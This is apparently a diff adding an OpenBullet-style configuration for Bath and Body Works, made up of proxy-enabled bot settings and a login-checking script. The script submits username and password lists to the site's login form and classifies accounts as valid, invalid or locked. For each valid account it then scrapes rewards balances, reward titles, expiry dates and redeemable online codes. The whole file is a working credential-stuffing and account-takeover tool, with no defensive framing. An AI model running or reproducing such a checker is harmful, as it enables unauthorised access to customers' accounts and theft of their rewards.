@@ -1,0 +1,112 @@
+[SETTINGS]
+{
+  "Name": "Bath and Body Works",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-18T20:34:20.585735-07:00",
+  "AdditionalInfo": "",
+  "Author": "Aquizzity#1000",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.bathandbodyworks.com/my-account" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "bathandbodyworks.com/my-account?dwcont=" "\"" -> VAR "1" 
+
+PARSE "<SOURCE>" LR "name=\"dwfrm_login_securekey\" value=\"" "\"" -> VAR "sKey" 
+
+REQUEST POST "https://www.bathandbodyworks.com/my-account?dwcont=<1>" AutoRedirect=FALSE 
+  CONTENT "dwfrm_login_username=<USER>&dwfrm_login_password=<PASS>&dwfrm_login_securekey=<sKey>&dwfrm_login_login=x&format=ajax" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://www.bathandbodyworks.com/my-account" 
+  HEADER "Origin: https://www.bathandbodyworks.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"emailHash\"" 
+  KEYCHAIN Failure OR 
+    KEY "Oops! This doesn't match our records. Please try again." 
+    KEY "Invalid password" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "This account is currently locked.  Please try again later." 
+    KEY "<h2>Please reset your password</h2>" 
+
+REQUEST GET "https://www.bathandbodyworks.com/on/demandware.store/Sites-BathAndBodyWorks-Site/en_US/Account-GetRewardsDataShort" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.bathandbodyworks.com/my-account" 
+
+PARSE "<SOURCE>" LR "\"currentSpend\":\"" "\"" CreateEmpty=FALSE -> CAP "Points" 
+
+REQUEST GET "https://www.bathandbodyworks.com/on/demandware.store/Sites-BathAndBodyWorks-Site/en_US/Account-IncludeWalletDetails" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "You currently have no Rewards available."
+
+FUNCTION Constant "False" -> CAP "Rewards" 
+
+ELSE
+
+PARSE "<SOURCE>" LR "data-type=\"REWARD\" data-title=\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Reward" 
+
+PARSE "<SOURCE>" LR "span class=\"reward-valid \">Valid through " "at " Recursive=TRUE CreateEmpty=FALSE -> CAP "Valid till" 
+
+PARSE "<SOURCE>" LR "<span class=\"reward-code\">" "</span>" Recursive=TRUE CreateEmpty=FALSE -> CAP "Online Code" 
+
+ENDIF
+
